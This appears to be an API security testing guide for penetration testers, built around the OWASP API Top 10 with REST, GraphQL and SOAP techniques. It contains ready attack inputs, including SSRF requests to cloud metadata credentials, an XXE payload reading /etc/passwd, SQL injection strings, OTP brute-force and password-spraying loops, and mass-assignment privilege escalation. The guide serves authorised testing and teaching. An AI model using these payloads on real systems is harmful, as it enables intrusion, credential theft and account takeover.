# API Security

!!! info "Why This Matters"
    APIs are now the dominant attack surface in modern applications. Every mobile app, SPA, and microservice architecture communicates via APIs. Interviewers expect you to test APIs as a distinct discipline — not just "web testing without a UI." The OWASP API Security Top 10 is tested as frequently as the web Top 10.

---

## API Types — Distinctions That Matter for Testing

### REST (Representational State Transfer)

Stateless, uses HTTP methods semantically (GET, POST, PUT, PATCH, DELETE), resources identified by URLs, responses in JSON (usually). Most common API type in modern applications.

Key testing considerations:
- HTTP method access control: does DELETE work when only GET should?
- Authorization per resource, per method: user can GET but not DELETE own resources, but can they DELETE another user's resource?
- Parameter types: query strings, URL path params, request body, headers — test all

### GraphQL

Single endpoint (usually `/graphql`), clients specify exactly what data they need in a query language. Enables powerful queries but introduces unique attack surface.

```graphql
# Query (read)
query {
  user(id: "123") {
    name
    email
    role
  }
}

# Mutation (write)
mutation {
  updateUser(id: "123", input: {role: "admin"}) {
    id
    role
  }
}

# Subscription (real-time)
subscription {
  orderUpdated(orderId: "456") { status }
}
```

### SOAP (Simple Object Access Protocol)

XML-based, uses WSDL (Web Services Description Language) to define operations. Older enterprise applications. WSDL is essentially documentation of all available operations — a goldmine for testing.

```bash
# Fetch WSDL
curl http://target.com/service?wsdl

# Parse WSDL with soapui or custom scripts
# Each <operation> in WSDL is a potential attack surface
```

---

## OWASP API Security Top 10 — Complete Reference

### API1:2023 — Broken Object Level Authorization (BOLA)

The most prevalent API vulnerability — the API equivalent of IDOR.

```
# User A's order
GET /api/v1/orders/10042
Authorization: Bearer user_a_token

# Change to User B's order ID
GET /api/v1/orders/10043
Authorization: Bearer user_a_token

# Should be 403 Forbidden. If 200 OK → BOLA
```

**What makes API BOLA different from web IDOR:** REST APIs return structured data (JSON) that may contain nested object IDs not visible in the UI. Always inspect the full JSON response for references to other objects you can try.

```json
{
  "order": {
    "id": 10042,
    "user_id": 500,         ← try changing this
    "invoice_id": 7741,     ← another reference to try
    "shipping_address_id": 331  ← and this
  }
}
```

**Testing methodology:**
1. Create two test accounts (User A and User B)
2. With User A, create/access resources → collect all object IDs
3. Switch to User B's token, attempt to access/modify/delete User A's resources
4. Test all HTTP methods against each resource
5. Test nested objects within responses

### API2:2023 — Broken Authentication

API-specific authentication failures:

**Weak/no token validation:**
```
# Test with invalid token
Authorization: Bearer invalid_token_123
# Should be 401. If 200 → no validation

# Test with expired token
# Modify 'exp' claim in JWT, re-sign or try without signature
```

**API keys in URLs (leaked in logs, Referer, browser history):**
```
GET /api/data?api_key=secretkey123  # Bad practice
GET /api/data                       # API key in header instead
Authorization: API-Key secretkey123
```

**Missing token expiration:**
```python
# Check JWT exp claim
import base64, json
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature"
payload = token.split('.')[1]
padding = 4 - len(payload) % 4
decoded = json.loads(base64.urlsafe_b64decode(payload + '=' * padding))
print(decoded.get('exp'))  # None = no expiration
```

### API3:2023 — Broken Object Property Level Authorization

Can users access/modify object properties they shouldn't?

**Excessive data exposure:** The API returns more data than the client displays:
```json
GET /api/v1/user/profile

{
  "name": "Alice",
  "email": "alice@example.com",
  "role": "user",               ← UI shows only name/email
  "api_key": "sk_live_xxx",    ← should never be returned
  "ssn": "123-45-6789",        ← sensitive field not shown in UI
  "internal_notes": "..."
}
```
The UI only shows name and email, but the raw API response contains sensitive fields.

**Mass Assignment:** Sending fields the API shouldn't accept:
```json
PATCH /api/v1/user/profile
{
  "name": "Alice Updated",
  "role": "admin",         ← should not be user-modifiable
  "verified": true,        ← should not be user-modifiable
  "balance": 99999         ← should not be user-modifiable
}
```
If the framework blindly assigns all request fields to the model object, any field can be modified.

**Testing mass assignment:**
```python
# Get the object first — note all its fields
GET /api/v1/user/profile → {"name":"Alice","email":"alice@example.com","role":"user"}

# Try updating each non-obvious field
PATCH /api/v1/user/profile
{"role": "admin"}          # Privilege escalation
{"email": "alice2@x.com"} # Normal (expected)
{"verified": true}
{"balance": 10000}
{"password": "newpass"}
{"api_key": "custom_key"}
```

### API4:2023 — Unrestricted Resource Consumption

No rate limiting on resource-intensive endpoints:

```bash
# Test for rate limiting presence
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code} " https://target.com/api/send-email
done
# All 200s → no rate limiting → DoS risk and abuse potential

# Specific scenarios:
# - OTP endpoints (brute force 6-digit code = 1M attempts)
# - Password reset (spam victims)
# - SMS sending (financial cost to organization)
# - Image/document processing (CPU intensive)
# - Search with wildcard (expensive DB queries)
```

**Testing OTP brute force window:**
```bash
# 6-digit OTP: 000000-999999 = 1,000,000 combinations
# With 1 second rate limit: 11 days to exhaust
# With no rate limit: seconds with Turbo Intruder
```

### API5:2023 — Broken Function Level Authorization (BFLA)

Users can access functions/operations they shouldn't.

```
# Regular user can call admin functions
POST /api/v1/admin/users/delete         # Should be admin-only
DELETE /api/v1/admin/reset-all-data     # Should be admin-only
GET /api/v1/internal/health-detailed    # Internal endpoint

# HTTP method escalation
GET /api/v1/order/10042     # User can read their order
DELETE /api/v1/order/10042  # Can they delete it? Other users' orders?
PUT /api/v1/order/10042     # Can they modify any order?
```

**Discovering admin/undocumented endpoints:**
```bash
# Wordlist-based discovery
gobuster dir -u https://api.target.com -w /usr/share/wordlists/api_endpoints.txt \
  -H "Authorization: Bearer user_token"

# From JavaScript source code
grep -r "api/" dist/
grep -r "fetch\|axios\|XMLHttpRequest" *.js

# From mobile app reverse engineering
# From Swagger/OpenAPI docs: /swagger.json, /api-docs, /openapi.json
curl https://target.com/swagger.json
curl https://target.com/api/v1/swagger.json
curl https://target.com/api-docs
```

### API6:2023 — Unrestricted Access to Sensitive Business Flows

Business logic flaws at the API level:

```
# Buying limited-edition item before sale starts
POST /api/v1/cart/add {"item_id": "limited_item", "quantity": 100}
# API doesn't enforce inventory reservation timing

# Multiple simultaneous checkout requests (race condition)
# Parallel: POST /api/v1/checkout × 10
# Coupon applied 10 times

# Account enumeration via API
POST /api/v1/auth/login {"email":"test@x.com","password":"x"}
→ "User not found"      # Confirms email doesn't exist
POST /api/v1/auth/login {"email":"alice@x.com","password":"x"}
→ "Invalid password"    # Confirms email exists
```

### API7:2023 — Server Side Request Forgery (SSRF)

Same as web SSRF but often more prevalent in API contexts — webhooks, URL fetching, import/export features:
```json
POST /api/v1/webhook
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

POST /api/v1/import
{"source_url": "http://internal-service:8080/admin/users"}
```

### API8:2023 — Security Misconfiguration

API-specific misconfigurations:

```bash
# CORS on API accepting any origin
curl -I -H "Origin: https://evil.com" https://api.target.com/data
# Access-Control-Allow-Origin: https://evil.com → misconfigured

# HTTP methods enabled unnecessarily
curl -X OPTIONS https://api.target.com/users
# Allow: GET, POST, PUT, DELETE, TRACE, CONNECT → TRACE and CONNECT should be disabled

# Verbose error messages
POST /api/v1/login {"user": "' OR 1=1--", "password": "x"}
# Response: "PDOException: SQLSTATE[42000]: Syntax error..." → reveals DB type and SQL error

# Debug endpoints in production
GET /api/debug/env     → environment variables
GET /api/debug/routes  → all API routes
GET /actuator/env      → Spring Boot actuator (full config dump!)
GET /actuator/heapdump → heap dump (may contain credentials in memory)
```

**Spring Boot Actuator endpoints to check:**
```bash
# Often exposed without authentication
/actuator
/actuator/env          # All environment variables (passwords!)
/actuator/configprops  # Configuration properties
/actuator/beans        # All Spring beans
/actuator/mappings     # All URL mappings
/actuator/heapdump     # JVM heap dump
/actuator/threaddump   # Thread dump
/actuator/trace or /actuator/httptrace  # Recent HTTP requests
```

### API9:2023 — Improper Inventory Management

Undocumented, old, or unmanaged API versions:

```bash
# Version enumeration
/api/v1/  → current
/api/v2/  → current
/api/v0/  → old, may lack new security controls
/api/beta/ → pre-release, less tested
/api/internal/  → internal-only endpoints exposed externally
/api/legacy/    → deprecated, unmaintained

# Mobile app APIs often different from web
# Check APK for hardcoded API endpoints
```

### API10:2023 — Unsafe Consumption of APIs

When the target application calls third-party APIs and trusts their responses without validation — out of scope for testing target's own API security.

---

## GraphQL-Specific Testing

### Introspection — The Documentation Attack

GraphQL introspection returns the complete schema — all types, queries, mutations, and subscriptions. In production, introspection should be disabled.

```bash
# Basic introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}}}"}'

# Full schema introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } } }"}'

# Using InQL (Burp extension) or graphql-voyager for visual schema mapping

# Extract all queries and mutations
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description args { name type { name } } } } mutationType { fields { name description } } } }"}'
```

If introspection is disabled, try:
```
# Field suggestion (Apollo default behavior)
{"query":"{user{nme}}"} → "Did you mean 'name'?" → field enumeration!

# Alternative introspection bypass
{"query":"{__schema{types{name}}}"}          # Standard
{"query":"{\n__schema{types{name}}}"}        # Newline
{"query":"fragment t on __Schema{types{name}} {  ...t}"}  # Fragment
```

### GraphQL Injection Points

```graphql
# BOLA via GraphQL
query { order(id: "10042") { ... } }
# Try other IDs: "10043", "10044"

# Mass assignment via mutation
mutation {
  updateProfile(input: {
    name: "Alice"
    role: "admin"         ← try adding fields
    verified: true
  }) { id name role }
}

# Batching attack — multiple queries in one request
[
  {"query": "query{user(id:\"1\"){name}}"},
  {"query": "query{user(id:\"2\"){name}}"},
  ...100 more
]
# Used to bypass rate limiting or brute force

# Nested query (DoS — deeply nested queries)
{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{}}}}}}}}}}}}}}}}
```

---

## API Testing Toolkit

### Burp Suite for APIs

```
# Configuration:
# - Add target API domain to scope
# - Use Repeater for manual testing
# - Use Intruder for fuzzing parameters
# - Use Logger++ extension to capture all API traffic
# - Use InQL extension for GraphQL

# Intercept mobile app API traffic:
# - Configure device proxy → Burp's IP:8080
# - Install Burp CA cert on device
# - For apps with certificate pinning: frida/objection to bypass
```

### Postman for API Exploration

```bash
# Import Swagger/OpenAPI definition
# Test all endpoints systematically
# Use pre-request scripts to add auth headers
# Use collection runner to test all endpoints
```

### REST Client — Manual Testing

```bash
# curl — your best friend for API testing
curl -X POST https://api.target.com/users \
  -H "Authorization: Bearer token123" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","role":"admin"}'

# HTTPie — more readable
http POST api.target.com/users \
  Authorization:"Bearer token123" \
  name=test email=test@test.com role=admin

# With different HTTP methods
http DELETE api.target.com/users/42 Authorization:"Bearer token123"
http PUT api.target.com/users/42 Authorization:"Bearer token123" role=admin
```

### API Fuzzing

```bash
# wfuzz — fuzz API parameters
wfuzz -c -z file,/wordlists/params.txt \
  -H "Authorization: Bearer token" \
  "https://api.target.com/user?FUZZ=value"

# ffuf — fast fuzzer for endpoints and parameters
ffuf -u "https://api.target.com/FUZZ" \
  -H "Authorization: Bearer token" \
  -w /wordlists/api_endpoints.txt

# Parameter fuzzing
ffuf -u "https://api.target.com/user?FUZZ=test" \
  -w /wordlists/parameters.txt \
  -mc 200,201,400  # Match only these status codes

# Nuclei — template-based API vulnerability scanning
nuclei -u https://api.target.com \
  -H "Authorization: Bearer token" \
  -t exposures/apis/ -t misconfiguration/
```

### Useful Wordlists for API Testing

```bash
# API endpoint wordlists (from SecLists)
/usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt

# HTTP parameter names
/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt

# GraphQL wordlist
/usr/share/wordlists/seclists/Discovery/Web-Content/graphql.txt
```

---

## REST API Testing — Deep Methodology

### Mapping the Full Attack Surface

Before testing a single endpoint, build a complete map of what the API exposes.

```bash
# 1. Swagger / OpenAPI documentation discovery
curl https://api.target.com/swagger.json
curl https://api.target.com/swagger-ui.html
curl https://api.target.com/api-docs
curl https://api.target.com/v1/swagger.json
curl https://api.target.com/openapi.json
curl https://api.target.com/openapi.yaml

# Use ffuf to discover documentation endpoints
ffuf -u https://api.target.com/FUZZ -w api_doc_paths.txt \
  -mc 200 -H "Authorization: Bearer token"

# 2. Extract endpoints from JavaScript source
# Download all JS files from the web app
wget -r -l 2 -A "*.js" https://app.target.com

# Extract API endpoints from JS
grep -rh "api\.\|/api/\|/v[0-9]/\|fetch(\|axios\.\|\.get(\|\.post(" *.js | \
  grep -oP "(?<=['\"]/)[a-z/]{3,}" | sort -u

# Better: use js-beautify + regex
js-beautify app.min.js | grep -oP "(?<=['\"]/)[a-zA-Z0-9/_-]{3,}" | sort -u

# 3. Traffic capture via proxy
# Browse entire application with Burp running
# Export site map: Target → Site map → right-click → Copy URLs in scope
# This gives you every endpoint the app actually calls

# 4. Mobile app analysis
# Decompile Android APK (jadx)
# Search for API endpoints
grep -r "retrofit\|okhttp\|volley\|apiService" output/ | grep "\"/"

# 5. Postman collection / Insomnia export
# Many companies publish their API collections publicly
# Search: site:github.com "collection" "postman" target.com
```

### Authentication Testing for APIs

```bash
# Test 1: Completely missing authentication
# Try every endpoint without any token
curl https://api.target.com/v1/users
curl https://api.target.com/v1/admin/config
# Any 200 without token = missing authentication

# Test 2: Expired token still accepted
# Use an old token (from days/weeks ago if you have one)
curl -H "Authorization: Bearer EXPIRED_TOKEN" https://api.target.com/v1/profile

# Test 3: Invalid token format accepted
curl -H "Authorization: Bearer invalid" https://api.target.com/v1/profile
curl -H "Authorization: Bearer " https://api.target.com/v1/profile
curl -H "Authorization: Bearer null" https://api.target.com/v1/profile

# Test 4: Token for wrong environment
# Dev token used against production, or vice versa
# Test token used against prod

# Test 5: API key in wrong location
# Some APIs accept the key in multiple locations — test all
curl "https://api.target.com/v1/data?api_key=KEY" 
curl -H "X-API-Key: KEY" https://api.target.com/v1/data
curl -H "Authorization: API-Key KEY" https://api.target.com/v1/data

# Test 6: HTTP vs HTTPS
# Does the API work over HTTP? Session token sent in cleartext?
curl http://api.target.com/v1/profile  # Should redirect to HTTPS or refuse

# Test 7: JWT algorithm attacks (covered in Level 2 Web Advanced)
# none algorithm, algorithm confusion, weak secret
```

### Rate Limiting Testing

```bash
# Test password reset / OTP endpoints (financial impact to org if no limit)
for i in {1..100}; do
  code=$(printf "%06d" $RANDOM)
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.target.com/v1/verify-otp \
    -H "Content-Type: application/json" \
    -d "{\"otp\":\"$code\",\"session\":\"SESSION_TOKEN\"}")
  echo "Attempt $i: OTP $code → $response"
  [[ $response == "200" ]] && echo "FOUND: $code" && break
done

# Test login endpoint spraying
for pass in "Password123!" "Summer2024!" "Welcome1"; do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST https://api.target.com/v1/auth/login \
    -d "{\"email\":\"victim@target.com\",\"password\":\"$pass\"}"
done

# Turbo Intruder for high-speed rate limit testing
# (Script in Burp → Turbo Intruder extension)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20)
    for i in range(1000000, 9999999):
        engine.queue(target.req, str(i))
```

### HTTP Method Testing

```bash
# For each discovered endpoint, test all HTTP methods
ENDPOINT="https://api.target.com/v1/users/123"

for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo -n "$method → "
  curl -s -o /dev/null -w "%{http_code}" \
    -X $method "$ENDPOINT" \
    -H "Authorization: Bearer USER_TOKEN"
done

# Common findings:
# GET /resource → 200 (read own resource)
# DELETE /resource → 403 (user can't delete)
# DELETE /other_user_resource → 200 (!!) → BOLA on DELETE
# OPTIONS → reveals all allowed methods
# PUT /resource → 403 but PATCH /resource → 200 (inconsistent method control)
```

### Mass Assignment Testing

```bash
# Get current object state
curl -s https://api.target.com/v1/users/me \
  -H "Authorization: Bearer token" | jq

# Response shows all object fields:
# {"id":123,"username":"alice","email":"alice@x.com","role":"user","verified":false,"credits":0}

# Try updating fields that shouldn't be user-modifiable
curl -X PATCH https://api.target.com/v1/users/me \
  -H "Authorization: Bearer token" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'                    # Role escalation

curl -X PATCH https://api.target.com/v1/users/me \
  -H "Authorization: Bearer token" \
  -d '{"verified":true}'                   # Bypass email verification

curl -X PATCH https://api.target.com/v1/users/me \
  -H "Authorization: Bearer token" \
  -d '{"credits":99999}'                   # Financial manipulation

curl -X PATCH https://api.target.com/v1/users/me \
  -H "Authorization: Bearer token" \
  -d '{"password":"NewPassword123!"}'      # Password change without old password

# Also test unexpected fields — some frameworks auto-bind unknown fields
curl -X PATCH https://api.target.com/v1/profile \
  -H "Authorization: Bearer token" \
  -d '{"is_premium":true,"subscription_expiry":"2099-01-01"}'
```

---

## SOAP API Testing

SOAP (Simple Object Access Protocol) uses XML messaging and WSDL (Web Services Description Language) for service definition. Common in legacy enterprise applications.

### WSDL Enumeration

```bash
# Discover WSDL
curl "http://target.com/service?wsdl"
curl "http://target.com/service.asmx?wsdl"
curl "http://target.com/ws/service?wsdl"

# WSDL contains complete service documentation:
# - All operations (functions) available
# - Input/output message formats
# - Data types

# Parse WSDL with SoapUI (GUI tool)
# File → New SOAP Project → Enter WSDL URL
# Generates request templates for all operations automatically

# Or parse manually — look for <operation> elements:
curl -s "http://target.com/service?wsdl" | grep -i "operation"
```

### SOAP Injection

```xml
<!-- SOAP request template -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:web="http://www.example.com/webservice">
   <soapenv:Header/>
   <soapenv:Body>
      <web:GetUser>
         <web:username>admin</web:username>
      </web:GetUser>
   </soapenv:Body>
</soapenv:Envelope>

<!-- SQL injection in SOAP parameter -->
<web:username>admin' OR '1'='1</web:username>

<!-- XXE via SOAP -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope>
   <soapenv:Body>
      <web:GetUser><web:username>&xxe;</web:username></web:GetUser>
   </soapenv:Body>
</soapenv:Envelope>

<!-- SOAP header injection — bypass authentication -->
<soapenv:Header>
   <web:AuthHeader>
      <web:Username>admin</web:Username>
      <web:Password>anything</web:Password>
      <web:Authenticated>true</web:Authenticated>  <!-- inject this -->
   </web:AuthHeader>
</soapenv:Header>
```

```bash
# Send SOAP request with curl
curl -s -X POST "http://target.com/service" \
  -H "Content-Type: text/xml;charset=UTF-8" \
  -H "SOAPAction: \"http://www.example.com/GetUser\"" \
  -d @soap_request.xml

# Automated SOAP testing with wsdler (Burp extension)
# Import WSDL → generates requests for all operations in Burp
```

---

## API-Specific Vulnerabilities by Category

### Business Logic in APIs

```
Price manipulation:
POST /api/checkout
{"items":[{"id":42,"qty":1,"price":999}]}
→ Modify price: {"items":[{"id":42,"qty":1,"price":0.01}]}

Quantity tricks:
POST /api/cart/add
{"item_id":42,"qty":-1}    # Negative quantity → credit to account?
{"item_id":42,"qty":999999} # Exceed inventory without reservation

Discount stacking:
POST /api/discount/apply {"code":"SAVE50"}  # Apply once
POST /api/discount/apply {"code":"SAVE50"}  # Apply again → duplicate?

Time-based:
POST /api/offer/redeem
{"offer_id":1}  # Before sale starts
# If offer_id is valid but start_date is in future → bypass time check?
```

### API Versioning Vulnerabilities

```bash
# Old API versions often have weaker security controls
# Test all versions discovered:
curl https://api.target.com/v1/users         # Current
curl https://api.target.com/v2/users         # Maybe newer
curl https://api.target.com/v0/users         # Old, possibly insecure
curl https://api.target.com/beta/users       # Pre-release
curl https://api.target.com/internal/users   # Internal-only?
curl https://api.target.com/legacy/users     # Deprecated?
curl https://api.target.com/api/v1/users     # Different base path?

# Common finding: /v1 requires authentication, /v0 doesn't
# Or: /v2 has rate limiting, /v1 doesn't
```

### Response Data Exposure Analysis

```bash
# Capture full API responses and analyze what's returned
# vs what the UI actually displays

# Script to compare displayed fields vs returned fields
curl -s https://api.target.com/v1/users/me \
  -H "Authorization: Bearer token" | \
  python3 -c "
import sys,json
data = json.load(sys.stdin)
print('All returned fields:')
def print_keys(d, prefix=''):
    for k,v in d.items():
        if isinstance(v, dict):
            print_keys(v, prefix+k+'.')
        else:
            print(f'  {prefix}{k}: {type(v).__name__}')
print_keys(data)
"

# Fields to flag if present but not shown in UI:
# - password_hash, password
# - api_key, secret_key, token
# - internal_notes, admin_notes
# - ssn, passport, credit_card
# - latitude, longitude (location data)
# - ip_address (may reveal internal infrastructure)
# - created_by_admin, is_banned (reveals moderation status)
```

---

## API Security Testing Checklist

```
Authentication:
□ No authentication required on any endpoint
□ Invalid token accepted
□ Expired token accepted
□ Token for wrong user accepted
□ API key accepted in wrong parameter location

Authorization:
□ BOLA — access other users' objects via ID manipulation
□ BFLA — access admin-only functions as regular user
□ Method switching — DELETE/PUT/PATCH when only GET expected
□ Indirect object references in nested JSON

Input Validation:
□ SQL injection in all string parameters
□ Command injection in filename/path parameters  
□ SSTI in template parameters
□ XXE in XML-accepting endpoints
□ Path traversal in file parameters

Business Logic:
□ Negative quantities
□ Price manipulation
□ Discount code reuse
□ Workflow step skipping
□ Time-based restrictions bypass

Rate Limiting:
□ Login endpoint
□ Password reset / OTP
□ Account registration (spam)
□ Resource-intensive operations

Data Exposure:
□ Fields returned not displayed in UI
□ Error messages revealing internal structure
□ Debug endpoints (/debug, /status, /health with sensitive data)

API-Specific:
□ Mass assignment — sending unintended fields
□ Old API version with weaker controls
□ GraphQL introspection enabled in production
□ SOAP WSDL exposed and injection tested
```
